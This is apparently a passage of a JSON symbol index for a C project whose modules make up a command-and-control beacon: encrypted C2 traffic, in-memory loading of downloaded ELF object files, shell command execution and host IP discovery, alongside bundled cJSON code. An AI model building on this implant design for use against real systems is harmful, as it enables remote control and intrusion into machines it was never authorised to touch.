"macro", "line": 24, "name": "AES_keyExpSize", "signature": "#define AES_keyExpSize"}, {"kind": "macro", "line": 26, "name": "AES_KEYLEN", "signature": "#define AES_KEYLEN"}, {"kind": "macro", "line": 27, "name": "AES_keyExpSize", "signature": "#define AES_keyExpSize"}, {"kind": "macro", "line": 29, "name": "AES_KEYLEN", "signature": "#define AES_KEYLEN"}, {"kind": "macro", "line": 30, "name": "AES_keyExpSize", "signature": "#define AES_keyExpSize"}]}, {"id": "include/aes_cfb.c", "kind": "module", "label": "aes_cfb.c", "language": "c", "sha256": "59be7e0c0f4072c3", "symbol_count": 6, "symbols": [{"doc": "This is the same algorithm the v1 beacon uses to wrap C2 commands and results. The C2 server in c2/server.py implements the matching Python side using the `cryptography` library.  Public API: unsigned char* aes256_cfb_encrypt(key, iv, plain, len, &out_len); unsigned char* aes256_cfb_decrypt(key, iv, cipher, len, &out_len);  Both return a malloc'd buffer the caller must free. The decrypt variant appends a trailing NUL byte for convenience.  include \"aes.h\" include <stdlib.h> include <string.h>", "kind": "function", "line": 19, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 47, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 23, "name": "AES_init_ctx", "signature": "AES_init_ctx(&ctx, key);"}, {"kind": "function", "line": 26, "name": "memcpy", "signature": "memcpy(iv_buf, iv, 16);"}, {"kind": "function", "line": 31, "name": "AES_ECB_encrypt", "signature": "AES_ECB_encrypt(&ctx, encrypted_iv);"}, {"kind": "function", "line": 40, "name": "memset", "signature": "memset(iv_buf + block_size, 0, 16 - block_size);"}]}, {"id": "include/aes_cfb.h", "kind": "module", "label": "aes_cfb.h", "language": "h", "sha256": "4176a3ec906a3da8", "symbol_count": 3, "symbols": [{"doc": "include <stddef.h>", "kind": "function", "line": 8, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv, const unsigned char* plaintext, size_t len, int* out_len);"}, {"kind": "function", "line": 11, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv, const unsigned char* ciphertext, size_t len, int* out_len);"}, {"kind": "macro", "line": 5, "name": "BSB_AES_CFB_H", "signature": "#define BSB_AES_CFB_H"}]}, {"doc": "beacon_api.h ifndef BEACON_API_H define BEACON_API_H  include <stdint.h> include <stdarg.h>  Tipos de callback define CALLBACK_OUTPUT 0x00 define CALLBACK_ERROR  0x0D define CALLBACK_OUTPUT_OEM 0x0E  Estructura para parsing de datos (opcional, para comandos complejos)", "id": "include/beacon.h", "kind": "module", "label": "beacon.h", "language": "h", "sha256": "8e53413733633991", "symbol_count": 13, "symbols": [{"doc": "Estructura para parsing de datos (opcional, para comandos complejos)", "kind": "struct", "line": 14, "name": "datap"}, {"doc": "=== API para BOFs ===", "kind": "function", "line": 21, "name": "BeaconDataParse", "signature": "void BeaconDataParse(datap *parser, char *buffer, int size);"}, {"kind": "function", "line": 22, "name": "BeaconDataPtr", "signature": "char *BeaconDataPtr(datap *parser, int size);"}, {"kind": "function", "line": 23, "name": "BeaconDataInt", "signature": "int BeaconDataInt(datap *parser);"}, {"kind": "function", "line": 24, "name": "BeaconDataShort", "signature": "short BeaconDataShort(datap *parser);"}, {"kind": "function", "line": 25, "name": "BeaconDataLength", "signature": "int BeaconDataLength(datap *parser);"}, {"kind": "function", "line": 26, "name": "BeaconDataExtract", "signature": "char *BeaconDataExtract(datap *parser, int *size);"}, {"kind": "function", "line": 27, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...);"}, {"kind": "function", "line": 28, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len);"}, {"kind": "macro", "line": 3, "name": "BEACON_API_H", "signature": "#define BEACON_API_H"}, {"kind": "macro", "line": 9, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 10, "name": "CALLBACK_ERROR", "signature": "#define CALLBACK_ERROR"}, {"kind": "macro", "line": 11, "name": "CALLBACK_OUTPUT_OEM", "signature": "#define CALLBACK_OUTPUT_OEM"}]}, {"id": "include/beacon_common.c", "kind": "module", "label": "beacon_common.c", "language": "c", "sha256": "ef20aa1594c62bdf", "symbol_count": 51, "symbols": [{"doc": "if (g_cache_count >= g_cache_capacity) { size_t new_cap = g_cache_capacity ? g_cache_capacity * 2 : 8; TrampolineCache *tmp = realloc(g_trampoline_cache, new_cap * sizeof(TrampolineCache)); if (!tmp) return tramp; g_trampoline_cache = tmp; g_cache_capacity = new_cap; } g_trampoline_cache[g_cache_count].original = target; g_trampoline_cache[g_cache_count].trampoline = tramp; g_cache_count++; return tramp; } /* --- HTTP client ---", "kind": "struct", "line": 220, "name": "MemoryStruct"}, {"doc": "{ \"BeaconOutput\",   &g_BeaconOutput_ptr }, { \"socket\",         &g_socket_ptr }, { \"connect\",        &g_connect_ptr }, { \"inet_addr\",      &g_inet_addr_ptr }, { \"htons\",          &g_htons_ptr }, { \"send\",           &g_send_ptr }, { \"recv\",           &g_recv_ptr }, { \"close\",          &g_close_ptr }, { \"getaddrinfo\",    &g_getaddrinfo_ptr }, { \"freeaddrinfo\",   &g_freeaddrinfo_ptr }, { NULL, NULL } }; /* --- Output buffer management ---", "kind": "function", "line": 100, "name": "bsb_output_init", "signature": "int bsb_output_init(size_t capacity)"}, {"kind": "function", "line": 109, "name": "bsb_output_cleanup", "signature": "void bsb_output_cleanup(void)"}, {"kind": "function", "line": 116, "name": "bsb_output_reset", "signature": "void bsb_output_reset(void)"}, {"doc": "free(g_beacon_output); g_beacon_output = NULL; g_output_capacity = 0; g_output_len = 0; } void bsb_output_reset(void) { if (g_beacon_output) { g_output_len = 0; g_beacon_output[0] = '\\0'; } } /* --- Beacon API (called by BOFs) ---", "kind": "function", "line": 125, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...)"}, {"kind": "function", "line": 137, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len)"}, {"doc": "void BeaconOutput(int type, const char *data, int len) { (void)type; if (!g_beacon_output || len <= 0 || !data) return; size_t remaining = g_output_capacity - g_output_len - 1; if ((size_t)len > remaining) { len = (int)remaining; } memcpy(g_beacon_output + g_output_len, data, len); g_output_len += len; g_beacon_output[g_output_len] = '\\0'; } /* --- Trampoline management ---", "kind": "function", "line": 151, "name": "create_trampoline", "signature": "void *create_trampoline(void *target)"}, {"kind": "function", "line": 180, "name": "cleanup_trampolines", "signature": "void cleanup_trampolines(void)"}, {"kind": "function", "line": 195, "name": "get_or_create_trampoline", "signature": "void *get_or_create_trampoline(void *target)"}, {"kind": "function", "line": 224, "name": "WriteMemoryCallback", "signature": "static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)"}, {"kind": "function", "line": 236, "name": "https_request", "signature": "http_response_t https_request(const bsb_config_t *cfg, const char *url,\n                         ..."}, {"doc": "curl_easy_cleanup(curl); return resp; } long http_code = 0; curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code); resp.status = (int)http_code; resp.data = chunk.memory; resp.len = chunk.size; curl_easy_cleanup(curl); return resp; } /* --- Base64 ---", "kind": "function", "line": 291, "name": "base64_encode", "signature": "char *base64_encode(const unsigned char *input, int len)"}, {"kind": "function", "line": 306, "name": "base64_decode", "signature": "unsigned char *base64_decode(const char *input, int *len)"}, {"doc": "if (!buffer) { BIO_free_all(b64); return NULL; } len = BIO_read(b64, buffer, input_len); BIO_free_all(b64); if (*len <= 0) { free(buffer); return NULL; } return buffer; } /* --- URL encoding ---", "kind": "function", "line": 329, "name": "_is_unreserved", "signature": "static int _is_unreserved(unsigned char c)"}, {"kind": "function", "line": 334, "name": "url_encode", "signature": "char *url_encode(const char *in, size_t in_len, size_t *out_len)"}, {"doc": "static const char hex[] = \"0123456789ABCDEF\"; out[j++] = '%'; out[j++] = hex[(c >> 4) & 0xF]; out[j++] = hex[c & 0xF]; } } out[j] = '\\0'; out_len = j; return out; } /* AES-256-CFB wrappers are in aes_cfb.c /* --- Command execution ---", "kind": "function", "line": 358, "name": "exec_cmd", "signature": "char *exec_cmd(const char *cmd, int *out_len)"}, {"doc": "if (total >= capacity - 1) { capacity *= 2; char *tmp = realloc(buffer, capacity); if (!tmp) break; buffer = tmp; } } pclose(fp); buffer[total] = '\\0'; out_len = (int)total; return buffer; } /* --- Backoff state ---", "kind": "function", "line": 385, "name": "bsb_backoff_init", "signature": "void bsb_backoff_init(bsb_backoff_t *bo, int base, int max)"}, {"kind": "function", "line": 390, "name": "bsb_backoff_next", "signature": "int bsb_backoff_next(bsb_backoff_t *bo)"}, {"kind": "function", "line": 399, "name": "bsb_backoff_reset", "signature": "void bsb_backoff_reset(bsb_backoff_t *bo)"}, {"doc": "int bsb_backoff_next(bsb_backoff_t *bo) { int val = bo->current_seconds; bo->current_seconds *= 2; if (bo->current_seconds > bo->max_seconds) { bo->current_seconds = bo->max_seconds; } return val; } void bsb_backoff_reset(bsb_backoff_t *bo) { bo->current_seconds = bo->base_seconds; } /* --- IP discovery ---", "kind": "function", "line": 405, "name": "get_local_ips", "signature": "char *get_local_ips(void)"}, {"doc": "for (int i = 0; i < n; i++) { struct sockaddr_in *addr = (struct sockaddr_in*)&ifr[i].ifr_addr; if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, \"lo\") != 0) { char ip[INET_ADDRSTRLEN]; inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN); if (strlen(result) > 0) strcat(result, \", \"); strcat(result, ip); } } close(sockfd); return strlen(result) > 0 ? result : strdup(\"127.0.0.1\"); } /* --- BOF download ---", "kind": "function", "line": 434, "name": "download_bof", "signature": "unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size)"}, {"doc": "/* --- BOF download --- unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size) { http_response_t resp = https_request(cfg, url, \"GET\", NULL); if (!resp.data || resp.len == 0) { out_size = 0; free(resp.data); return NULL; } out_size = resp.len; return (unsigned char *)resp.data; } /* --- BOF execution with fork isolation ---", "kind": "function", "line": 446, "name": "init_function_pointers", "signature": "static void init_function_pointers(void)"}, {"kind": "function", "line": 471, "name": "page_align", "signature": "static size_t page_align(size_t size)"}, {"kind": "function", "line": 477, "name": "__attribute__", "signature": "static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char *args, uintptr_t ar..."}, {"kind": "function", "line": 506, "name": "RunELF", "signature": "int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,\n           unsig..."}, {"kind": "function", "line": 710, "name": "run_bof_and_capture", "signature": "char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize,\n                           ..."}, {"kind": "function", "line": 111, "name": "free", "signature": "free(g_beacon_output);"}, {"kind": "function", "line": 129, "name": "va_start", "signature": "va_start(args, fmt);"}, {"kind": "function", "line": 132, "name": "va_end", "signature": "va_end(args);"}, {"kind": "function", "line": 145, "name": "memcpy", "signature": "memcpy(g_beacon_output + g_output_len, data, len);"}, {"kind": "function", "line": 169, "name": "munmap", "signature": "munmap(code, code_size);"}, {"kind": "function", "line": 244, "name": "curl_easy_setopt", "signature": "curl_easy_setopt(curl, CURLOPT_URL, url);"}, {"kind": "function", "line": 277, "name": "curl_easy_cleanup", "signature": "curl_easy_cleanup(curl);"}, {"kind": "function", "line": 282, "name": "curl_easy_getinfo", "signature": "curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);"}, {"kind": "function", "line": 295, "name": "BIO_set_flags", "signature": "BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);"}, {"kind": "function", "line": 296, "name": "BIO_write", "signature": "BIO_write(b64, input, len);"}, {"kind": "function", "line": 297, "name": "BIO_flush", "signature": "BIO_flush(b64);"}, {"kind": "function", "line": 299, "name": "BIO_get_mem_ptr", "signature": "BIO_get_mem_ptr(b64, &bptr);"}, {"kind": "function", "line": 303, "name": "BIO_free_all", "signature": "BIO_free_all(b64);"}, {"kind": "function", "line": 363, "name": "pclose", "signature": "pclose(fp);"}, {"kind": "function", "line": 413, "name": "close", "signature": "close(sockfd);"}, {"kind": "function", "line": 414, "name": "strdup", "signature": "return strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 424, "name": "inet_ntop", "signature": "inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);"}, {"kind": "function", "line": 426, "name": "strcat", "signature": "strcat(result, ip);"}, {"kind": "function", "line": 430, "name": "strlen", "signature": "return strlen(result) > 0 ? result : strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 479, "name": "volatile", "signature": "asm volatile( \"push %%rbp\\n\\t\" \"mov %%rsp, %%rbp\\n\\t\" \"push %%rbx\\n\\t\" \"push %%r12\\n\\t\" \"push %%r13\\n\\t\" \"push %%r14\\n\\t\" \"push %%r15\\n\\t\" \"sub $8, %%rsp\\n\\t\" \"mov %0, %%rdi\\n\\t\" \"mov %1, %%rsi\\n\\t\" \""}, {"kind": "function", "line": 594, "name": "memset", "signature": "memset(addr, 0, aligned_size);"}, {"kind": "function", "line": 690, "name": "call_bof_isolated", "signature": "call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);"}, {"kind": "function", "line": 693, "name": "_exit", "signature": "_exit(0);"}, {"kind": "function", "line": 696, "name": "waitpid", "signature": "waitpid(pid, &status, 0);"}, {"kind": "macro", "line": 9, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}]}, {"id": "include/beacon_common.h", "kind": "module", "label": "beacon_common.h", "language": "h", "sha256": "3ca14e40e11e7c3d", "symbol_count": 58, "symbols": [{"doc": "-- HTTP response wrapper --- https_request now returns a proper struct instead of the * broken full+8 pointer trick that leaked memory.", "kind": "struct", "line": 32, "name": "http_response_t"}, {"doc": "-- HTTP response wrapper --- https_request now returns a proper struct instead of the * broken full+8 pointer trick that leaked memory. typedef struct { char    *data;      /* response body (malloc'd, caller frees) size_t   len;       /* body length in bytes int      status;    /* HTTP status code (0 on error) } http_response_t; /* --- Trampoline (for position-independent BOF relocations) ---", "kind": "struct", "line": 39, "name": "Trampoline"}, {"doc": "size_t   len;       /* body length in bytes int      status;    /* HTTP status code (0 on error) } http_response_t; /* --- Trampoline (for position-independent BOF relocations) --- typedef struct { void    *addr; size_t   size; } Trampoline; /* --- BOF function signature --- typedef void (*bof_func_t)(char*, int); /* --- Symbol resolver table entry ---", "kind": "struct", "line": 48, "name": "SymbolResolver"}, {"doc": "void    *addr; size_t   size; } Trampoline; /* --- BOF function signature --- typedef void (*bof_func_t)(char*, int); /* --- Symbol resolver table entry --- typedef struct { const char  *name; void       **ptr; } SymbolResolver; /* --- Trampoline cache entry ---", "kind": "struct", "line": 54, "name": "TrampolineCache"}, {"doc": "Exponential backoff state. Initialize once, call bsb_backoff_next() * to get the next sleep duration. Automatically resets on success.", "kind": "struct", "line": 173, "name": "bsb_backoff_t"}, {"doc": "broken full+8 pointer trick that leaked memory. typedef struct { char    *data;      /* response body (malloc'd, caller frees) size_t   len;       /* body length in bytes int      status;    /* HTTP status code (0 on error) } http_response_t; /* --- Trampoline (for position-independent BOF relocations) --- typedef struct { void    *addr; size_t   size; } Trampoline; /* --- BOF function signature ---", "kind": "function", "line": 45, "name": "void", "signature": "typedef void (*bof_func_t)(char*, int);"}, {"doc": "Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure.", "kind": "function", "line": 93, "name": "bsb_output_init", "signature": "int bsb_output_init(size_t capacity);"}, {"doc": "Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown.", "kind": "function", "line": 96, "name": "bsb_output_cleanup", "signature": "void bsb_output_cleanup(void);"}, {"doc": "Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution.", "kind": "function", "line": 99, "name": "bsb_output_reset", "signature": "void bsb_output_reset(void);"}, {"doc": "Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution. void bsb_output_reset(void); /* Beacon API: printf-style output capture (called by BOFs).", "kind": "function", "line": 102, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...);"}, {"doc": "Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_output_init(size_t capacity); /* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution. void bsb_output_reset(void); /* Beacon API: printf-style output capture (called by BOFs). void BeaconPrintf(int type, const char *fmt, ...); /* Beacon API: raw output capture (called by BOFs).", "kind": "function", "line": 105, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len);"}, {"doc": "/* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new BOF execution. void bsb_output_reset(void); /* Beacon API: printf-style output capture (called by BOFs). void BeaconPrintf(int type, const char *fmt, ...); /* Beacon API: raw output capture (called by BOFs). void BeaconOutput(int type, const char *data, int len); /* Trampoline management", "kind": "function", "line": 108, "name": "create_trampoline", "signature": "void *create_trampoline(void *target);"}, {"kind": "function", "line": 109, "name": "cleanup_trampolines", "signature": "void cleanup_trampolines(void);"}, {"kind": "function", "line": 110, "name": "get_or_create_trampoline", "signature": "void *get_or_create_trampoline(void *target);"}, {"doc": "HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, data is NULL and len is 0. The caller must free(data). * Uses config for timeouts, TLS verification, and user-agent.", "kind": "function", "line": 116, "name": "https_request", "signature": "http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);"}, {"doc": "HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, data is NULL and len is 0. The caller must free(data). * Uses config for timeouts, TLS verification, and user-agent. http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data); /* Base64 encode/decode (OpenSSL BIO-based)", "kind": "function", "line": 122, "name": "base64_encode", "signature": "char *base64_encode(const unsigned char *input, int len);"}, {"kind": "function", "line": 123, "name": "base64_decode", "signature": "unsigned char *base64_decode(const char *input, int *len);"}, {"doc": "HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, data is NULL and len is 0. The caller must free(data). * Uses config for timeouts, TLS verification, and user-agent. http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data); /* Base64 encode/decode (OpenSSL BIO-based) char           *base64_encode(const unsigned char *input, int len); unsigned char  *base64_decode(const char *input, int *len); /* URL percent-encoding (RFC 3986 unreserved set)", "kind": "function", "line": 126, "name": "url_encode", "signature": "char *url_encode(const char *in, size_t in_len, size_t *out_len);"}, {"doc": "Uses config for timeouts, TLS verification, and user-agent. http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data); /* Base64 encode/decode (OpenSSL BIO-based) char           *base64_encode(const unsigned char *input, int len); unsigned char  *base64_decode(const char *input, int *len); /* URL percent-encoding (RFC 3986 unreserved set) char *url_encode(const char *in, size_t in_len, size_t *out_len); /* AES-256-CFB encrypt/decrypt (standalone, no OpenSSL dependency)", "kind": "function", "line": 129, "name": "aes256_cfb_encrypt", "signature": "unsigned char *aes256_cfb_encrypt(const unsigned char *key, const unsigned char *iv, const unsigned char *plaintext, size_t len, int *out_len);"}, {"kind": "function", "line": 133, "name": "aes256_cfb_decrypt", "signature": "unsigned char *aes256_cfb_decrypt(const unsigned char *key, const unsigned char *iv, const unsigned char *ciphertext, size_t len, int *out_len);"}, {"kind": "function", "line": 139, "name": "buffer", "signature": "* buffer (caller frees). On error, returns NULL. */ char *exec_cmd(const char *cmd, int *out_len);"}, {"doc": "ELF BOF loader. Loads a position-independent ELF object into memory, resolves symbols, applies relocations, and calls the entry function in a forked child process for crash isolation. Returns 0 on success, -1 on error. BOF output is captured * into g_beacon_output.", "kind": "function", "line": 147, "name": "RunELF", "signature": "int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize, unsigned char *argumentdata, int argumentSize);"}, {"doc": "Download a BOF from the C2 server. Returns malloc'd buffer * (caller frees). On error, sets *out_size to 0 and returns NULL.", "kind": "function", "line": 155, "name": "download_bof", "signature": "unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size);"}, {"doc": "Execute a BOF and capture its output. Returns malloc'd string * (caller frees). On error or empty output, returns strdup(\"\").", "kind": "function", "line": 161, "name": "run_bof_and_capture", "signature": "char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize, char *args, int arglen, int *out_len);"}, {"doc": "Get local IP addresses as a comma-separated string. Returns * malloc'd buffer (caller frees). Falls back to \"127.0.0.1\".", "kind": "function", "line": 169, "name": "get_local_ips", "signature": "char *get_local_ips(void);"}, {"kind": "function", "line": 178, "name": "bsb_backoff_init", "signature": "void bsb_backoff_init(bsb_backoff_t *bo, int base, int max);"}, {"kind": "function", "line": 180, "name": "bsb_backoff_next", "signature": "int bsb_backoff_next(bsb_backoff_t *bo);"}, {"kind": "function", "line": 181, "name": "bsb_backoff_reset", "signature": "void bsb_backoff_reset(bsb_backoff_t *bo);"}, {"doc": "/* --- Symbol resolver table entry --- typedef struct { const char  *name; void       **ptr; } SymbolResolver; /* --- Trampoline cache entry --- typedef struct { void    *original; void    *trampoline; } TrampolineCache; /* --- Global state (defined in beacon_common.c) ---", "kind": "variable", "line": 60, "name": "g_beacon_output", "signature": "extern char *g_beacon_output;"}, {"kind": "variable", "line": 61, "name": "g_output_len", "signature": "extern size_t g_output_len;"}, {"kind": "variable", "line": 62, "name": "g_output_capacity", "signature": "extern size_t g_output_capacity;"}, {"doc": "} SymbolResolver; /* --- Trampoline cache entry --- typedef struct { void    *original; void    *trampoline; } TrampolineCache; /* --- Global state (defined in beacon_common.c) --- extern char    *g_beacon_output; extern size_t   g_output_len; extern size_t   g_output_capacity; /* Function pointers exposed to BOFs", "kind": "variable", "line": 65, "name": "g_printf_ptr", "signature": "extern void *g_printf_ptr;"}, {"kind": "variable", "line": 66, "name": "g_strlen_ptr", "signature": "extern void *g_strlen_ptr;"}, {"kind": "variable", "line": 67, "name": "g_memcpy_ptr", "signature": "extern void *g_memcpy_ptr;"}, {"kind": "variable", "line": 68, "name": "g_memset_ptr", "signature": "extern void *g_memset_ptr;"}, {"kind": "variable", "line": 69, "name": "g_exit_ptr", "signature": "extern void *g_exit_ptr;"}, {"kind": "variable", "line": 70, "name": "g_dlsym_ptr", "signature": "extern void *g_dlsym_ptr;"}, {"kind": "variable", "line": 71, "name": "g_dlerror_ptr", "signature": "extern void *g_dlerror_ptr;"}, {"kind": "variable", "line": 72, "name": "g_dlopen_ptr", "signature": "extern void *g_dlopen_ptr;"}, {"kind": "variable", "line": 73, "name": "g_dlclose_ptr", "signature": "extern void *g_dlclose_ptr;"}, {"kind": "variable", "line": 74, "name": "g_write_ptr", "signature": "extern void *g_write_ptr;"}, {"kind": "variable", "line": 75, "name": "g_mmap_ptr", "signature": "extern void *g_mmap_ptr;"}, {"kind": "variable", "line": 76, "name": "g_munmap_ptr", "signature": "extern void *g_munmap_ptr;"}, {"kind": "variable", "line": 77, "name": "g_BeaconPrintf_ptr", "signature": "extern void *g_BeaconPrintf_ptr;"}, {"kind": "variable", "line": 78, "name": "g_BeaconOutput_ptr", "signature": "extern void *g_BeaconOutput_ptr;"}, {"kind": "variable", "line": 79, "name": "g_socket_ptr", "signature": "extern void *g_socket_ptr;"}, {"kind": "variable", "line": 80, "name": "g_connect_ptr", "signature": "extern void *g_connect_ptr;"}, {"kind": "variable", "line": 81, "name": "g_inet_addr_ptr", "signature": "extern void *g_inet_addr_ptr;"}, {"kind": "variable", "line": 82, "name": "g_htons_ptr", "signature": "extern void *g_htons_ptr;"}, {"kind": "variable", "line": 83, "name": "g_send_ptr", "signature": "extern void *g_send_ptr;"}, {"kind": "variable", "line": 84, "name": "g_recv_ptr", "signature": "extern void *g_recv_ptr;"}, {"kind": "variable", "line": 85, "name": "g_close_ptr", "signature": "extern void *g_close_ptr;"}, {"kind": "variable", "line": 86, "name": "g_getaddrinfo_ptr", "signature": "extern void *g_getaddrinfo_ptr;"}, {"kind": "variable", "line": 87, "name": "g_freeaddrinfo_ptr", "signature": "extern void *g_freeaddrinfo_ptr;"}, {"kind": "macro", "line": 13, "name": "BEACON_COMMON_H", "signature": "#define BEACON_COMMON_H"}, {"kind": "macro", "line": 14, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 26, "name": "BSB_OUTPUT_BUFFER_DEFAULT", "signature": "#define BSB_OUTPUT_BUFFER_DEFAULT"}, {"kind": "macro", "line": 27, "name": "BSB_OUTPUT_TRUNCATION_MARKER", "signature": "#define BSB_OUTPUT_TRUNCATION_MARKER"}]}, {"id": "include/cJSON.c", "kind": "module", "label": "cJSON.c", "language": "c", "sha256": "a247f4a0e2f25bd4", "symbol_count": 140, "symbols": [{"kind": "struct", "line": 157, "name": "internal_hooks"}, {"kind": "struct", "line": 88, "name": "error"}, {"kind": "struct", "line": 291, "name": "parse_buffer"}, {"kind": "struct", "line": 482, "name": "printbuffer"}, {"kind": "function", "line": 94, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)"}, {"kind": "function", "line": 99, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)"}, {"kind": "function", "line": 109, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)"}, {"doc": "CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item) { if (!cJSON_IsNumber(item)) { return (double) NAN; } return item->valuedouble; } /* This is a safeguard to prevent copy-pasters from using incompatible C and header files if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) error cJSON.h and cJSON.c have different versions. Make sure that both have the same. endif", "kind": "function", "line": 124, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(const char*) cJSON_Version(void)"}, {"doc": "/* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) #error cJSON.h and cJSON.c have different versions. Make sure that both have the same. #endif CJSON_PUBLIC(const char*) cJSON_Version(void) { static char version[15]; sprintf(version, \"%i.%i.%i\", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH); return version; } /* Case insensitive string comparison, doesn't consider two NULL pointers equal though", "kind": "function", "line": 134, "name": "case_insensitive_strcmp", "signature": "static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)"}, {"doc": "} return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t size); void (CJSON_CDECL *deallocate)(void *pointer); void *(CJSON_CDECL *reallocate)(void *pointer, size_t size); } internal_hooks; #if defined(_MSC_VER) /* work around MSVC error C2322: '...' address of dllimport '...' is not static", "kind": "function", "line": 166, "name": "internal_malloc", "signature": "static void * CJSON_CDECL internal_malloc(size_t size)"}, {"kind": "function", "line": 170, "name": "internal_free", "signature": "static void CJSON_CDECL internal_free(void *pointer)"}, {"kind": "function", "line": 174, "name": "internal_realloc", "signature": "static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)"}, {"kind": "function", "line": 188, "name": "cJSON_strdup", "signature": "static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)"}, {"kind": "function", "line": 209, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)"}, {"doc": "if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc are used global_hooks.reallocate = NULL; if ((global_hooks.allocate == malloc) && (global_hooks.deallocate == free)) { global_hooks.reallocate = realloc; } } /* Internal constructor.", "kind": "function", "line": 242, "name": "cJSON_New_Item", "signature": "static cJSON *cJSON_New_Item(const internal_hooks * const hooks)"}, {"doc": "item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate(item->string); item->string = NULL; } global_hooks.deallocate(item); item = next; } } /* get the decimal point character of the current locale", "kind": "function", "line": 281, "name": "get_decimal_point", "signature": "static unsigned char get_decimal_point(void)"}, {"doc": "size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks hooks; } parse_buffer; /* check if the given size is left to read in a given parse buffer (starting with 1) #define can_read(buffer, size) ((buffer != NULL) && (((buffer)->offset + size) <= (buffer)->length)) /* check if the buffer can be accessed at the given index (starting with 0) #define can_access_at_index(buffer, index) ((buffer != NULL) && (((buffer)->offset + index) < (buffer)->length)) #define cannot_access_at_index(buffer, index) (!can_access_at_index(buffer, index)) /* get a pointer to the buffer at the position #define buffer_at_offset(buffer) ((buffer)->content + (buffer)->offset) /* Parse the input text to generate a number, and populate the result into item.", "kind": "function", "line": 309, "name": "parse_number", "signature": "static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "} typedef struct { unsigned char *buffer; 